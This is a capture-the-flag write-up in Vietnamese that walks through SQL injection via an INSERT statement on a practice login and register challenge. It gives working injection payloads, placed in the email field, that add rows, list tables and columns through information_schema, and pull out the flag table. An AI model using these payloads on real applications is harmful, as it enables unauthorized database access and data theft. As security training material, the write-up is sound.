![image](https://user-images.githubusercontent.com/125866921/233823593-4ac7583e-2e6a-49e0-b701-692c803f265a.png)

  - Bước vào challenge thì có 2 form là ``login`` và ``register``.  
  - Như tên của đề bài, SQL Injection INSERT sẽ thực hiện các yêu cầu SQL để chèn hoặc thay đổi dữ liệu trong cơ sở dữ liệu của ứng dụng.  
  - Sau khi tạo 1 tài khoản và đăng nhập thì sẽ xuất hiện 2 trường là ``username`` và ``email``. Nhưng ở ``username`` thì bị giới hạn kí tự và bị filter đối vối mốt số kí tự. Do đó ta sẽ inject vào phần ``email``.  
  - Sau 1 thời gian tìm hiểu thì biết rằng có thể chèn nhiều hàng vào 1 cột bằng cách sau:  

        INSERT INTO table (a, b,c) value ('a','b','c'),('d','e','f').  
        
  - Qua đó ta có thể suy ra được payload như sau:  

        email'),('username', 'password', 'SQLi') -- -.
        
      - Do ta chỉ lấy cột ``email`` để inject.  

  - Bây giờ ta sẽ thử khai thác trong database xem có những bảng nào.  

        email'),('x','x',(select group_concat(table_name) from information_schema.tables where table_schema=database())) -- -
        
![image](https://user-images.githubusercontent.com/125866921/233824263-928494d3-56a9-4935-9ad6-64178bc2447e.png)

  - Ta thấy ở phần ``email`` có 2 bảng là ``membres`` và ``flag``.  
  - Ta tiếp tục truy cập vào bảng flag.  

        email'),('y','y',(select group_concat(column_name) from information_schema.columns where table_name='flag')) -- -
        
![image](https://user-images.githubusercontent.com/125866921/233824359-55cea035-ec8e-48bf-97c7-b1be5c301356.png)

  - Bây giờ thì nó xuất hiện thêm 1 cột là ``flag``.
  - Truy cập vào cột đó và lấy flag thôi.  

        email'),('z','z',(select group_concat(flag) from flag)) -- -
